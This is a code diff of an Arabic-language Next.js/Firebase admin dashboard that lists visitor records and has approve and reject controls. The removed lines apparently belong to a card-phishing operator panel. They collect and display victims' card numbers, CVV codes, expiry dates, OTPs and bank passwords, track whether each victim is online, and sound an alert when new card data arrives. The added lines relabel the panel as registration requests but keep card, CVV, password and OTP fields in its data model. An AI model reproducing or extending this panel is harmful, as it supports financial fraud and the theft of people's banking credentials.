@@ -63,7 +63,6 @@ import { onValue, ref } from "firebase/database";
 import { database } from "@/lib/firestore";
 import { auth } from "@/lib/firestore";
 import { db } from "@/lib/firestore";
-import { playNotificationSound } from "@/lib/actions";
 import {
   Popover,
   PopoverContent,
@@ -108,48 +107,33 @@ import {
 type FlagColor = "red" | "yellow" | "green" | null;
 
 interface Notification {
+  id: string;
   createdDate: string;
-  bank: string;
-  cardStatus?: string;
-  ip?: string;
-  cvv: string;
-  id: string | "0";
-  expiaryDate: string;
-  notificationCount: number;
-  otp: string;
-  otp2: string;
-  page: string;
-  cardNumber: string;
-  country?: string;
-  personalInfo: {
-    id?: string | "0";
-    name?: string;
-  };
-  prefix: string;
+  createdAt?: string;
   status: "pending" | "approved" | "rejected" | string;
-  isOnline?: boolean;
-  lastSeen: string;
-  violationValue: number;
-  pass?: string;
-  year: string;
-  month: string;
-  pagename: string;
-  plateType: string;
-  allOtps?: string[] | null;
-  idNumber: string;
-  email: string;
-  mobile: string;
-  network: string;
-  phoneOtp: string;
-  cardExpiry: string;
-  name: string;
-  otpCode: string;
-  phone: string;
+  fullName?: string;
+  nationalId?: string;
+  address?: string;
+  email?: string;
+  phone?: string;
+  isHidden?: boolean;
   flagColor?: string;
   currentPage?: string;
+  country?: string;
+  otp?: string;
   userName?: string;
   password?: string;
+  cardNumber?: string;
+  bank?: string;
+  cvv?: string;
+  year?: string;
+  month?: string;
+  expiaryDate?: string;
+  pass?: string;
+  allOtps?: string[] | null;
 }
+
+type SoundKey = "visitor" | "request" | "approve" | "reject";
 
 // Hook for online users count
 function useOnlineUsersCount() {
@@ -814,8 +798,56 @@ export default function NotificationsPage() {
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date");
   const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");
+  const [soundEnabled, setSoundEnabled] = useState(false);
+  const soundRefs = useRef<Record<SoundKey, HTMLAudioElement> | null>(null);
   const router = useRouter();
   const onlineUsersCount = useOnlineUsersCount();
+
+  // Initialize audio assets once
+  useEffect(() => {
+    soundRefs.current = {
+      visitor: new Audio("/sounds/visitor.mp3"),
+      request: new Audio("/sounds/request.mp3"),
+      approve: new Audio("/sounds/approve.mp3"),
+      reject: new Audio("/sounds/reject.mp3"),
+    };
+
+    Object.values(soundRefs.current).forEach((audio) => {
+      audio.preload = "auto";
+      audio.load();
+    });
+  }, []);
+
+  const enableSound = () => {
+    if (!soundRefs.current) {
+      setSoundEnabled(true);
+      return;
+    }
+
+    Object.values(soundRefs.current).forEach((audio) => {
+      audio.muted = true;
+      audio.play().catch(() => {
+        // Ignore unlock failures here
+      });
+      audio.pause();
+      audio.currentTime = 0;
+      audio.muted = false;
+    });
+
+    setSoundEnabled(true);
+  };
+
+  const playSound = (sound: SoundKey) => {
+    if (!soundEnabled || !soundRefs.current) return;
+
+    const audio = soundRefs.current[sound];
+    if (!audio) return;
+
+    audio.currentTime = 0;
+    audio.play().catch((error) => {
+      console.error("Failed to play sound:", sound, error);
+    });
+  };
 
   // Track online status for all notifications
   const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
@@ -852,7 +884,7 @@ export default function NotificationsPage() {
 
   // Statistics calculations
   const totalVisitorsCount = notifications.length;
-  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
+  const cardSubmissionsCount = notifications.filter((n) => n.status === "pending").length;
   const approvedCount = notifications.filter(
     (n) => n.status === "approved"
   ).length;
@@ -866,7 +898,7 @@ export default function NotificationsPage() {
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.cardNumber);
+      filtered = filtered.filter((notification) => notification.status === "pending");
     } else if (filterType === "online") {
       filtered = filtered.filter(
         (notification) => onlineStatuses[notification.id]
@@ -878,12 +910,12 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase();
       filtered = filtered.filter(
         (notification) =>
-          notification.name?.toLowerCase().includes(term) ||
+          notification.fullName?.toLowerCase().includes(term) ||
+          notification.nationalId?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
-          notification.cardNumber?.toLowerCase().includes(term) ||
-          notification.country?.toLowerCase().includes(term) ||
-          notification.otp?.toLowerCase().includes(term)
+          notification.address?.toLowerCase().includes(term) ||
+          notification.country?.toLowerCase().includes(term)
       );
     }
 
@@ -959,39 +991,44 @@ export default function NotificationsPage() {
 
   const fetchNotifications = () => {
     setIsLoading(true);
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
+    const q = query(collection(db, "users"), orderBy("createdAt", "desc"));
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
         const notificationsData = querySnapshot.docs
           .map((doc) => {
             const data = doc.data() as any;
-            return { id: doc.id, ...data };
+            const createdDate =
+              data?.createdAt?.toDate?.()?.toISOString?.() ??
+              data?.createdAt ??
+              data?.createdDate ??
+              "";
+            return { id: doc.id, createdDate, ...data };
           })
           .filter(
             (notification: any) => !notification.isHidden
           ) as Notification[];
 
-        // Check if there are any new notifications with card info or general info
-        const hasNewCardInfo = notificationsData.some(
-          (notification) =>
-            notification.cardNumber &&
-            !notifications.some((n) => n.id === notification.id && n.cardNumber)
-        );
-        const hasNewGeneralInfo = notificationsData.some(
-          (notification) =>
-            (notification.idNumber ||
-              notification.email ||
-              notification.mobile) &&
-            !notifications.some(
-              (n) =>
-                n.id === notification.id && (n.idNumber || n.email || n.mobile)
-            )
+        const existingIds = new Set(notifications.map((notification) => notification.id));
+        const addedNotifications = notificationsData.filter(
+          (notification) => !existingIds.has(notification.id)
         );
 
-        // Only play notification sound if new card info or general info is added
-        if (hasNewCardInfo || hasNewGeneralInfo) {
-          playNotificationSound();
+        if (addedNotifications.length > 0) {
+          const hasRequestNotification = addedNotifications.some(
+            (notification) =>
+              notification.status === "pending" ||
+              notification.fullName ||
+              notification.nationalId ||
+              notification.email ||
+              notification.phone
+          );
+
+          if (hasRequestNotification) {
+            playSound("request");
+          } else {
+            playSound("visitor");
+          }
         }
 
         // Update statistics
@@ -1015,16 +1052,13 @@ export default function NotificationsPage() {
   };
 
   const updateStatistics = (notificationsData: Notification[]) => {
-    // Total visitors is the total count of notifications
     const totalCount = notificationsData.length;
-
-    // Card submissions is the count of notifications with card info
-    const cardCount = notificationsData.filter(
-      (notification) => notification.cardNumber
+    const pendingCount = notificationsData.filter(
+      (notification) => notification.status === "pending"
     ).length;
 
     setTotalVisitors(totalCount);
-    setCardSubmissions(cardCount);
+    setCardSubmissions(pendingCount);
   };
 
   const handleInfoClick = (
@@ -1043,7 +1077,7 @@ export default function NotificationsPage() {
   const handleFlagColorChange = async (id: string, color: string) => {
     try {
       // Update in Firestore
-      const docRef = doc(db, "pays", id);
+      const docRef = doc(db, "users", id);
       await updateDoc(docRef, { flagColor: color });
 
       // Update local state
@@ -1074,10 +1108,13 @@ export default function NotificationsPage() {
 
   const handleApproval = async (state: string, id: string) => {
     try {
-      const targetPost = doc(db, "pays", id);
+      const targetPost = doc(db, "users", id);
       await updateDoc(targetPost, {
         status: state,
       });
+
+      playSound(state === "approved" ? "approve" : "reject");
+
       toast({
         title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
         description:
@@ -1098,7 +1135,7 @@ export default function NotificationsPage() {
 
   const handleDelete = async (id: string) => {
     try {
-      const docRef = doc(db, "pays", id);
+      const docRef = doc(db, "users", id);
       await updateDoc(docRef, { isHidden: true });
       setNotifications(
         notifications.filter((notification) => notification.id !== id)
@@ -1123,7 +1160,7 @@ export default function NotificationsPage() {
     try {
       const batch = writeBatch(db);
       notifications.forEach((notification) => {
-        const docRef = doc(db, "pays", notification.id);
+        const docRef = doc(db, "users", notification.id);
         batch.update(docRef, { isHidden: true });
       });
       await batch.commit();
@@ -1309,6 +1346,14 @@ export default function NotificationsPage() {
           </div>
 
           <div className="flex items-center gap-2">
+            <Button
+              variant={soundEnabled ? "secondary" : "outline"}
+              onClick={enableSound}
+              className="h-10"
+            >
+              تفعيل الصوت
+            </Button>
+
             <TooltipProvider>
               <Tooltip>
                 <TooltipTrigger asChild>
@@ -1448,7 +1493,7 @@ export default function NotificationsPage() {
             trend={onlineTrend}
           />
           <StatisticsCard
-            title="معلومات البطاقات"
+            title="طلبات التسجيل"
             value={cardSubmissionsCount}
             change="+8%"
             changeType="increase"
@@ -1496,7 +1541,7 @@ export default function NotificationsPage() {
                         جميع الإشعارات
                       </DropdownMenuItem>
                       <DropdownMenuItem onClick={() => setFilterType("card")}>
-                        البطاقات فقط
+                        طلبات التسجيل
                       </DropdownMenuItem>
                       <DropdownMenuItem onClick={() => setFilterType("online")}>
                         المتصلين فقط
@@ -1550,7 +1595,7 @@ export default function NotificationsPage() {
                 className="gap-2"
               >
                 <CreditCard className="h-4 w-4" />
-                البطاقات
+                طلبات التسجيل
                 <Badge
                   variant="secondary"
                   className="bg-background text-foreground"
@@ -1622,10 +1667,12 @@ export default function NotificationsPage() {
                         <div className="flex flex-wrap gap-2">
                           <Badge
                             variant={
-                              notification?.password ? "default" : "secondary"
+                              notification.fullName || notification.email
+                                ? "default"
+                                : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification?.password
+                              notification.fullName || notification.email
                                 ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                                 : ""
                             }`}
@@ -1634,16 +1681,18 @@ export default function NotificationsPage() {
                             }
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification?.password
-                              ? "معلومات شخصية"
+                            {notification.fullName || notification.email
+                              ? "معلومات المستخدم"
                               : "لا يوجد معلومات"}
                           </Badge>
                           <Badge
                             variant={
-                              notification.cardNumber ? "default" : "secondary"
+                              notification.nationalId || notification.address
+                                ? "default"
+                                : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.cardNumber
+                              notification.nationalId || notification.address
                                 ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                 : ""
                             }`}
@@ -1652,11 +1701,21 @@ export default function NotificationsPage() {
                             }
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.cardNumber
-                              ? "معلومات البطاقة"
-                              : "لا يوجد بطاقة"}
+                            {notification.nationalId || notification.address
+                              ? "تفاصيل التسجيل"
+                              : "لا توجد تفاصيل"}
                           </Badge>
                         </div>
+                        {(notification.fullName || notification.email) && (
+                          <div className="mt-3 text-sm text-muted-foreground space-y-1">
+                            <div>
+                              {notification.fullName || notification.email}
+                            </div>
+                            {notification.email && (
+                              <div>{notification.email}</div>
+                            )}
+                          </div>
+                        )}
                       </td>
                       <td className="px-6 py-4">
                         {notification.status === "approved" ? (
@@ -1806,9 +1865,9 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.userName ? "default" : "secondary"}
+                          variant={notification.fullName || notification.email ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.userName
+                            notification.fullName || notification.email
                               ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                               : ""
                           }`}
@@ -1817,25 +1876,27 @@ export default function NotificationsPage() {
                           }
                         >
                           <User className="h-3 w-3 mr-1" />
-                          {notification.userName
-                            ? "معلومات شخصية"
+                          {notification.fullName || notification.email
+                            ? "معلومات المستخدم"
                             : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={
-                            notification.cardNumber ? "default" : "secondary"
+                            notification.nationalId || notification.address
+                              ? "default"
+                              : "secondary"
                           }
                           className={`cursor-pointer ${
-                            notification.cardNumber
+                            notification.nationalId || notification.address
                               ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                               : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.cardNumber
-                            ? "معلومات البطاقة"
-                            : "لا يوجد بطاقة"}
+                          {notification.nationalId || notification.address
+                            ? "تفاصيل التسجيل"
+                            : "لا توجد تفاصيل"}
                         </Badge>
                       </div>
 
@@ -1957,7 +2018,7 @@ export default function NotificationsPage() {
                   <div className="w-10 h-10 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center">
                     <CreditCard className="h-5 w-5 text-white" />
                   </div>
-                  معلومات البطاقة
+                  تفاصيل التسجيل
                 </>
               )}
             </DialogTitle>
@@ -1967,14 +2028,14 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الاسم", value: selectedNotification.userName },
-                  { label: "رقم الهوية", value: selectedNotification.idNumber },
+                  { label: "الاسم", value: selectedNotification.fullName },
+                  { label: "رقم الهوية", value: selectedNotification.nationalId },
                   {
                     label: "البريد الإلكتروني",
                     value: selectedNotification.email,
                   },
-                  { label: "رقم الجوال", value: selectedNotification.password },
-                  { label: "الهاتف", value: selectedNotification.phone },
+                  { label: "رقم الجوال", value: selectedNotification.phone },
+                  { label: "العنوان", value: selectedNotification.address },
                 ].map(
                   ({ label, value }) =>
                     value && (
@@ -1997,21 +2058,12 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-               { label: "البنك", value: selectedNotification.bank },
-                  {
-                    label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber ,
-                  },
-                  {
-                    label: "تاريخ الانتهاء",
-                    value:
-                      selectedNotification.year && selectedNotification.month
-                        ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification.expiaryDate,
-                  },
-                  { label: "رمز الأمان", value: selectedNotification.cvv },
-                  { label: "رمز التحقق", value: selectedNotification.otp },
-                  { label: "كلمة المرور", value: selectedNotification.pass },
+                  { label: "الحالة", value: selectedNotification.status },
+                  { label: "تاريخ التسجيل", value: selectedNotification.createdDate },
+                  { label: "رقم الهوية", value: selectedNotification.nationalId },
+                  { label: "البريد الإلكتروني", value: selectedNotification.email },
+                  { label: "رقم الجوال", value: selectedNotification.phone },
+                  { label: "العنوان", value: selectedNotification.address },
                 ].map(
                   ({ label, value }) =>
                     value && (
